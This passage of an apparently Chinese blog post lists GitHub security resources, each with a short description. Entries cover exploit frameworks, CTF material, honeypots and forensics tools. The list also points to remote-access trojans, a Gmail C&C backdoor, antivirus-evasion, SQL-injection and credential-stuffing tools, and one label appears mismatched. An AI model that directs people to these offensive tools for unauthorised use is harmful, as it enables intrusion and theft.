Exploit Development工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lillypad/badger</span><br></pre></td></tr></table></figure><p>二进制静态分析工具（python）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bdcht/amoco</span><br></pre></td></tr></table></figure><p>Python Exploit Development Assistance for GDB:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/longld/peda</span><br></pre></td></tr></table></figure><p>对BillGates Linux Botnet系木马活动的监控工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ValdikSS/billgates-botnet-tracker</span><br></pre></td></tr></table></figure><p>木马配置参数提取工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/kevthehermit/RATDecoders</span><br></pre></td></tr></table></figure><p>Shellphish编写的二进制分析工具（CTF向）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/angr/angr</span><br></pre></td></tr></table></figure><p>针对python的静态代码分析工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/yinwang0/pysonar2</span><br></pre></td></tr></table></figure><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/koalaman/shellcheck</span><br></pre></td></tr></table></figure><p>基于AST变换的简易Javascript反混淆辅助工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ChiChou/etacsufbo</span><br></pre></td></tr></table></figure><h2 id="12-EXP编写框架及工具"><a href="#12-EXP编写框架及工具" class="headerlink" title="12.EXP编写框架及工具"></a>12.EXP编写框架及工具</h2><p>二进制EXP编写工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/t00sh/rop-tool</span><br></pre></td></tr></table></figure><p>CTF Pwn 类题目脚本编写框架:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Gallopsled/pwntools</span><br></pre></td></tr></table></figure><p>an easy-to-use io library for pwning development:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zTrix/zio</span><br></pre></td></tr></table></figure><p>跨平台注入工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frida/frida</span><br></pre></td></tr></table></figure><p>哈希长度扩展攻击EXP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/citronneur/rdpy</span><br></pre></td></tr></table></figure><h2 id="13-隐写"><a href="#13-隐写" class="headerlink" title="13.隐写"></a>13.隐写</h2><p>隐写检测工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/abeluck/stegdetect</span><br></pre></td></tr></table></figure><h2 id="14-各类安全资料"><a href="#14-各类安全资料" class="headerlink" title="14.各类安全资料"></a>14.各类安全资料</h2><p>data_hacking合集:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ClickSecurity/data_hacking</span><br></pre></td></tr></table></figure><p>mobile-security-wiki:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/exploitprotocol/mobile-security-wiki</span><br></pre></td></tr></table></figure><p>书籍《reverse-engineering-for-beginners》:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/veficos/reverse-engineering-for-beginners</span><br></pre></td></tr></table></figure><p>一些信息安全标准及设备配置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/luyg24/IT_security</span><br></pre></td></tr></table></figure><p>APT相关笔记:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/kbandla/APTnotes</span><br></pre></td></tr></table></figure><p>Kcon资料:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/knownsec/KCon</span><br></pre></td></tr></table></figure><p>《DO NOT FUCK WITH A HACKER》:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/citypw/DNFWAH</span><br></pre></td></tr></table></figure><p>各类安全脑洞图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/phith0n/Mind-Map</span><br></pre></td></tr></table></figure><p>信息安全流程图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</span><br></pre></td></tr></table></figure><h2 id="15-各类CTF资源"><a href="#15-各类CTF资源" class="headerlink" title="15.各类CTF资源"></a>15.各类CTF资源</h2><p>近年ctf writeup大全：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ctfs/write-ups-2016</span><br><span class="line">https://github.com/ctfs/write-ups-2015</span><br><span class="line">https://github.com/ctfs/write-ups-2014</span><br></pre></td></tr></table></figure><p>fbctf竞赛平台Demo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/facebook/fbctf</span><br></pre></td></tr></table></figure><p>ctf Resources:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ctfs/resources</span><br></pre></td></tr></table></figure><p>ctf及黑客资源合集:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bt3gl/My-Gray-Hacker-Resources</span><br></pre></td></tr></table></figure><p>ctf和安全工具大合集:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zardus/ctf-tools</span><br></pre></td></tr></table></figure><p>ctf向 python工具包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/P1kachu/v0lt</span><br></pre></td></tr></table></figure><h2 id="16-各类编程资源"><a href="#16-各类编程资源" class="headerlink" title="16.各类编程资源"></a>16.各类编程资源</h2><p>大礼包（什么都有）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bayandin/awesome-awesomeness</span><br></pre></td></tr></table></figure><p>bash-handbook:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/denysdovhan/bash-handbook</span><br></pre></td></tr></table></figure><p>python资源大全:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jobbole/awesome-python-cn</span><br></pre></td></tr></table></figure><p>git学习资料:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/xirong/my-git</span><br></pre></td></tr></table></figure><p>安卓开源代码解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/android-cn/android-open-project</span><br></pre></td></tr></table></figure><p>python框架，库，资源大合集:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vinta/awesome-python</span><br></pre></td></tr></table></figure><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/VerbalExpressions/JSVerbalExpressions</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="17-Python"><a href="#17-Python" class="headerlink" title="17.Python"></a>17.Python</h2><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/VerbalExpressions/</span><br></pre></td></tr></table></figure><p>python任务管理以及命令执行库:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pyinvoke/invoke</span><br></pre></td></tr></table></figure><p>python exe打包库:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pyinstaller/pyinstaller</span><br></pre></td></tr></table></figure><p>Veil-Evasion免杀项目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Veil-Framework/Veil-Evasion</span><br></pre></td></tr></table></figure><p>py3 爬虫框架:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/orf/cyborg</span><br></pre></td></tr></table></figure><p>一个提供底层接口数据包编程和网络协议支持的python库:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/CoreSecurity/impacket</span><br></pre></td></tr></table></figure><p>python requests 库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/kennethreitz/requests</span><br></pre></td></tr></table></figure><p>python 实用工具合集:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mahmoud/boltons</span><br></pre></td></tr></table></figure><p>python爬虫系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/binux/pyspider</span><br></pre></td></tr></table></figure><h2 id="18-福利"><a href="#18-福利" class="headerlink" title="18.福利"></a>18.福利</h2><p>微信自动抢红包动态库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/east520/AutoGetRedEnv</span><br></pre></td></tr></table></figure><p>微信抢红包插件（安卓版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/geeeeeeeeek/WeChatLuckyMoney</span><br></pre></td></tr></table></figure><p>hardsed神器:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/yangyangwithgnu/hardseed</span><br></pre></td></tr></table></figure><p>19.甲方安全工程师生存指南</p><p>web索引及日志搜索工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/thomaspatzke/WASE</span><br></pre></td></tr></table></figure><p>开源日志采集器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wgliang/logcool</span><br></pre></td></tr></table></figure><p>扫描CS结构的web debuger</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Kozea/wdb</span><br></pre></td></tr></table></figure><p>恢复sqlite数据库删除注册信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/aramosf/recoversqlite/</span><br></pre></td></tr></table></figure><p>gps欺骗检测工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zxsecurity/gpsnitch</span><br></pre></td></tr></table></figure><p>应急处置响应框架:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/biggiesmallsAG/nightHawkResponse</span><br></pre></td></tr></table></figure><p>web安全开发指南:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FallibleInc/security-guide-for-developers</span><br></pre></td></tr></table></figure><p>各个知名厂商漏洞测试报告模板：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/juliocesarfort/public-pentesting-reports</span><br></pre></td></tr></table></figure><p>linux下恶意代码检测包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rfxn/linux-malware-detect</span><br></pre></td></tr></table></figure><p>操作系统运行指标可视化框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/facebook/osquery</span><br></pre></td></tr></table></figure><p>恶意代码分析系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cuckoosandbox/cuckoo</span><br></pre></td></tr></table></figure><p>定期搜索及存储web应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Netflix/Scumblr</span><br></pre></td></tr></table></figure><p>事件响应框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/google/grr</span><br></pre></td></tr></table></figure><p>综合主机监控检测平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ossec/ossec-hids</span><br></pre></td></tr></table></figure><p>分布式实时数字取证系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mozilla/mig</span><br></pre></td></tr></table></figure><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sleuthkit/sleuthkit</span><br></pre></td></tr></table></figure><h2 id="20-蜜罐"><a href="#20-蜜罐" class="headerlink" title="20.蜜罐"></a>20.蜜罐</h2><p>SSH蜜罐：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/desaster/kippo</span><br></pre></td></tr></table></figure><p>蜜罐集合资源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/paralax/awesome-honeypots</span><br></pre></td></tr></table></figure><p>kippo进阶版蜜罐：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/micheloosterhof/cowrie</span><br></pre></td></tr></table></figure><p>SMTP 蜜罐：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/awhitehatter/mailoney</span><br></pre></td></tr></table></figure><p>web应用程序蜜罐：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mushorg/glastopf</span><br></pre></td></tr></table></figure><p>数据库蜜罐：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jordan-wright/elastichoney</span><br></pre></td></tr></table></figure><p>web蜜罐：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/atiger77/Dionaea</span><br></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="21-远控"><a href="#21-远控" class="headerlink" title="21.远控"></a>21.远控</h2><p>用gmail充当C&amp;C服务器的后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/byt3bl33d3r/gcat</span><br></pre></td></tr></table></figure><p>开源的远控：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/UbbeLoL/uRAT</span><br></pre></td></tr></table></figure><p>c#远控：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hussein-aitlahcen/BlackHole</span><br></pre></td></tr></table></figure><h2 id="22-工具合集"><a href="#22-工具合集" class="headerlink" title="22.工具合集"></a>22.工具合集</h2><p>(NoSQL扫描/爆破工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/torque59/Nosql-Exploitation-Framework</span><br></pre></td></tr></table></figure><p>(MySQL盲注爆破工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/missDronio/blindy</span><br></pre></td></tr></table></figure><p>(基于SQLMAP的主动和被动资源发现的漏洞扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fengxuangit/Fox-scan</span><br></pre></td></tr></table></figure><p>(用于SQL Server审计的powershell脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/NetSPI/PowerUpSQL</span><br></pre></td></tr></table></figure><p>(用于http header中的时间盲注爆破工具，仅针对MySQL / MariaDB)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/JohnTroony/Blisqy</span><br></pre></td></tr></table></figure><p>(Java编写的SQL注入工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ron190/jsql-injection</span><br></pre></td></tr></table></figure><p>(基于搜索引擎的批量SQL注入漏洞扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Hadesy2k/sqliv</span><br></pre></td></tr></table></figure><p>(在sqlmap基础上增加了目录扫描，hash爆破等功能)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/sqlmate</span><br></pre></td></tr></table></figure><p>(Mysys以及MSSQL爆破脱裤工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m8r0wn/enumdb</span><br></pre></td></tr></table></figure><p>(批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/9tail123/wooscan</span><br></pre></td></tr></table></figure><p>(一个简单的HTTP暴力破解，撞库攻击脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/htpwdScan</span><br></pre></td></tr></table></figure><p>(对各类服务进行弱口令检测的脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ysrc/F-Scrack</span><br></pre></td></tr></table></figure><p>(根据用户习惯生成弱口令探测字典脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Mebus/cupp</span><br></pre></td></tr></table></figure><p>(Go写的协程版的ssh \redis \ mongodb弱口令破解工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/netxfly/crack_ssh</span><br></pre></td></tr></table></figure><p>(暴力破解字典建立工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LandGrey/pydictor</span><br></pre></td></tr></table></figure><p>(多线程探测弱口令)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shengqi158/weak_password_detect</span><br></pre></td></tr></table></figure><p>(支持测试CSRF，Clickjacking，Cloudflare和WAF的弱口令探测器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/Blazy</span><br></pre></td></tr></table></figure><p>(对CiscoVPN，Citrix Gateway等各类服务进行弱口令检测的脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/MooseDojo/myBFF</span><br></pre></td></tr></table></figure><p>(物联网设备默认密码扫描检测工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rapid7/IoTSeeker</span><br></pre></td></tr></table></figure><p>(使用nmap扫描IoT设备)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shodan-labs/iotdb</span><br></pre></td></tr></table></figure><p>(路由器设备漏洞扫描利用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/googleinurl/RouterHunterBR</span><br></pre></td></tr></table></figure><p>(Telnet服务密码撞库)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/scu-igroup/telnet-scanner</span><br></pre></td></tr></table></figure><p>(自动化信息搜集及渗透测试工具，比较适用于IoT扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/viraintel/OWASP-Nettacker</span><br></pre></td></tr></table></figure><p>(嵌入式设备漏洞扫描及利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/threat9/routersploit</span><br></pre></td></tr></table></figure><p>(一款XSS扫描器，可暴力注入参数)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shawarkhanethicalhacker/BruteXSS</span><br></pre></td></tr></table></figure><p>(小型XSS扫描器，也可检测CRLF，XSS，点击劫持的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/1N3/XSSTracer</span><br></pre></td></tr></table></figure><p>(PHP版本的反射型xss扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/0x584A/fuzzXssPHP</span><br></pre></td></tr></table></figure><p>(批量扫描XSS的python脚本)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/chuhades/xss_scan</span><br></pre></td></tr></table></figure><p>(自动化检测页面是否存在XSS和跨站请求伪造漏洞的浏览器插件)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BlackHole1/autoFindXssAndCsrf</span><br></pre></td></tr></table></figure><p>(使用命令行进行XSS批量检测)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shogunlab/shuriken</span><br></pre></td></tr></table></figure><p>(可识别和绕过WAF的XSS扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/s0md3v/XSStrike</span><br></pre></td></tr></table></figure><p>(支持GET，POST方式的高效XSS扫描器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/stamparm/DSXS</span><br></pre></td></tr></table></figure><p>(网络资产识别引擎，漏洞检测引擎)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ysrc/xunfeng</span><br></pre></td></tr></table></figure><p>(企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱，子域名，主持人)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/laramies/theHarvester</span><br></pre></td></tr></table></figure><p>(Bing，google，360，zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/x0day/Multisearch-v2</span><br></pre></td></tr></table></figure><p>(能成抓取搜索引擎隐藏的url，并交由sqlmap，nmap扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Ekultek/Zeus-Scanner</span><br></pre></td></tr></table></figure><p>(企业内网基础服务安全扫描框架)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/0xbug/Biu-framework</span><br></pre></td></tr></table></figure><p>(github Repo信息搜集工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/metac0rtex/GitHarvester</span><br></pre></td></tr></table></figure><p>(.svn文件夹泄漏利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shengqi158/svnhack</span><br></pre></td></tr></table></figure><p>(GitHub敏感信息扫描工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/repoog/GitPrey</span><br></pre></td></tr></table></figure><p>(企业资产，敏感信息GitHub泄露监控系统)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/0xbug/Hawkeye</span><br></pre></td></tr></table></figure><p>(根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lianfeng30/githubscan</span><br></pre></td></tr></table></figure><p>(github敏感信息搜索工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/UnkL4b/GitMiner</span><br></pre></td></tr></table></figure><p>( .git文件夹泄漏利用工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/GitHack</span><br></pre></td></tr></table></figure><p>(GitHub敏感信息扫描工具，包括检测提交等)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dxa4481/truffleHog</span><br></pre></td></tr></table></figure><p>(自动化对指定域名进行Google hacking搜索并收集信息)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/1N3/Goohak</span><br></pre></td></tr></table></figure><p>(用于搜索git的承诺中的敏感信息，例如密码，私钥等的客户端工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/UKHomeOffice/repo-security-scanner</span><br></pre></td></tr></table></figure><p>(Github敏感信息泄露扫描)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 